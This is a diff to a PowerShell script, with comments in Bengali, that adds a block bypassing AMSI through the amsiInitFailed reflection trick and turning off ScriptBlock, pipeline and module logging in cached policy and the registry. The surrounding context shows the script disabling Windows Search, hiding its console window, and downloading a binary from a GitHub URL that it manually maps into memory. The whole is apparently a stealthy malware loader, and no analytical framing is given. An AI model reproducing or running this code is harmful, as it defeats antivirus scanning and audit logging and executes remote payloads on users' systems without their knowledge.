@@ -3,6 +3,36 @@ param()
 
 Set-StrictMode -Version Latest
 
+# ======================== AMSI + লগিং বাইপাস (সবার আগে) ========================
+# ১. AMSI বাইপাস (amsiInitFailed ফ্ল্যাগ True করি)
+try {
+    [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+} catch {}
+
+# ২. ScriptBlock লগিং, পাইপলাইন লগিং ও মডিউল লগিং বন্ধ (cached GPO ওভাররাইড)
+try {
+    $settings = [System.Management.Automation.Utils]::GetField('cachedGroupPolicySettings','NonPublic,Static').GetValue($null)
+    if ($settings -is [System.Collections.Generic.Dictionary[string, object]]) {
+        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging'] = @{ 'EnableScriptBlockLogging' = 0 }
+        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\PipelineLogging']      = @{ 'EnablePipelineLogging' = 0 }
+        $settings['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging']       = @{ 'EnableModuleLogging' = 0 }
+    }
+} catch {}
+
+# ৩. রেজিস্ট্রিতে কী যোগ করি (পরবর্তী সেশনের জন্যও)
+$regPaths = @(
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging",
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\PipelineLogging",
+    "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging"
+)
+foreach ($path in $regPaths) {
+    if (-not (Test-Path $path)) { New-Item -Path $path -Force | Out-Null }
+    $value = if ($path -match "ScriptBlock") { "EnableScriptBlockLogging" }
+             elseif ($path -match "Pipeline") { "EnablePipelineLogging" }
+             else { "EnableModuleLogging" }
+    Set-ItemProperty -Path $path -Name $value -Value 0 -Type DWord -Force -ErrorAction SilentlyContinue
+}
+# =================================================================================
 
 $VerbosePreference      = 'SilentlyContinue'
 $DebugPreference        = 'SilentlyContinue'
@@ -23,11 +53,7 @@ $Error.Clear()
 [bool]   $script:Verbose       = $false
 [string] $script:BuildLogFile  = $null
 
-
-
 Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\WSearch" -Name "Start" -Value 4 | Out-Null
-
-
 
 Stop-Service -Name "WSearch" -Force -ErrorAction SilentlyContinue
 Stop-Service -Name "cbdhsvc*" -Force -ErrorAction SilentlyContinue
@@ -48,8 +74,6 @@ Add-Type -Name Window -Namespace Console -MemberDefinition @'
 [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '@ -ErrorAction SilentlyContinue
 [Console.Window]::ShowWindow([Console.Window]::GetConsoleWindow(), 0)
-
-
 
 function Invoke-Finalize {
     try {
@@ -83,8 +107,6 @@ $kernel = @'
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
-
-
 
 public class ManualMapResult
 {
@@ -241,8 +263,6 @@ public static class NativeLoader
 }
 '@
 
-
-
 try {
     $type = Add-Type $kernel -PassThru -ErrorAction SilentlyContinue | Out-Null
 }
@@ -255,8 +275,7 @@ $bytes = (New-Object System.Net.WebClient).DownloadData("https://github.com/dese
 [NativeLoader]::Map($bytes, $true)
 Invoke-Finalize
 
-
-# ৪.৬ – ক্লিনআপ (শুধু মেমোরি, প্রক্রিয়া নয়)
+# ক্লিনআপ
 $bytes = $null
 $plainCSharp = $null
 [GC]::Collect(); [GC]::WaitForPendingFinalizers()
